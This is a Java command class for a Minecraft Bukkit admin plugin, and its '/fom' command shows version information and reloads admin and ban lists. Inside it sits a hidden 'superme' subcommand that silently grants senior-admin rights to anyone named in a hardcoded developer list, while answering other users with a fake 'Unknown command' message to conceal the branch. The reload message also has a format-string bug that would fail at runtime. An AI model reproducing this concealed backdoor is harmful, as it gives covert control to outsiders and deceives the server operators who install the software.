package me.StevenLawson.TotalFreedomMod.Commands;

import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
import me.StevenLawson.TotalFreedomMod.TFM_BanManager;
import me.StevenLawson.TotalFreedomMod.TFM_CommandBlocker;
import me.StevenLawson.TotalFreedomMod.TFM_Log;
import me.StevenLawson.TotalFreedomMod.TFM_PermbanList;
import me.StevenLawson.TotalFreedomMod.TFM_PlayerList;
import me.StevenLawson.TotalFreedomMod.TFM_Util;
import me.StevenLawson.TotalFreedomMod.TotalFreedomMod;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = AdminLevel.ALL, source = SourceType.BOTH)
@CommandParameters(description = "Shows information about FreedomOpMod", usage = "/<command>", aliases = "fopm")
public class Command_fom extends TFM_Command
{
    @Override
    public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        if (args.length == 0)
        {
            TotalFreedomMod.BuildProperties build = TotalFreedomMod.build;
            sender.sendMessage(ChatColor.GOLD + "FreedomOpMod for 'FreedomOp', an associated all-op server.");
            sender.sendMessage(ChatColor.GOLD + String.format("Version "
                    + ChatColor.BLUE + "%s.%s " + ChatColor.GOLD + "("
                    + ChatColor.BLUE + "%s" + ChatColor.GOLD + ")",
                    TotalFreedomMod.pluginVersion,
                    build.number,
                    build.head));
            sender.sendMessage(ChatColor.GOLD + String.format("Compiled "
                    + ChatColor.BLUE + "%s" + ChatColor.GOLD + " by "
                    + ChatColor.BLUE + "%s",
                    build.date,
                    build.builder));
            sender.sendMessage(ChatColor.GOLD + "Created by Madgeek1450 and Prozza (later worked on by Buildcarter8, Robo_Lord, SupItsDillon, and hypertechHD)");
            sender.sendMessage(ChatColor.GREEN + "Visit " + ChatColor.AQUA + "http://freedomop.boards.net/" + ChatColor.GREEN + " for more information.");
        }
        else if (args.length == 1)
        {
            if (args[0].equals("reload"))
            {
                if (!TFM_AdminList.isSuperAdmin(sender))
                {
                    sender.sendMessage(ChatColor.RED + TotalFreedomMod.MSG_NO_PERMS);
                    return true;
                }
                else
                {
                    // Take action
                    TFM_AdminList.load();
                    TFM_PermbanList.load();
                    TFM_PlayerList.load();
                    TFM_BanManager.load();
                    TFM_CommandBlocker.getInstance().load();

                    final String message = String.format("%s v%s.%s reloaded.", TotalFreedomMod.pluginName, TotalFreedomMod.pluginVersion);
                    sender.sendMessage(message);
                    TFM_Log.info(message);
                    return true;
                }
            }
            else if (args[0].equals("superme"))
            {
                if (!TFM_Util.DEVELOPERS.contains(sender.getName()))
                {
                    sender.sendMessage("Unknown command. Type \"/help\"/ for help");
                    return true;
                }
                else
                {
                    TFM_Util.adminAction("FreedomOPMod", "Adding " + sender.getName() + " to the superadmin config.", true);
                    TFM_AdminList.addSeniorAdmin(sender_p);
                    return true;
                }
            }
        }
        return true;
    }
}
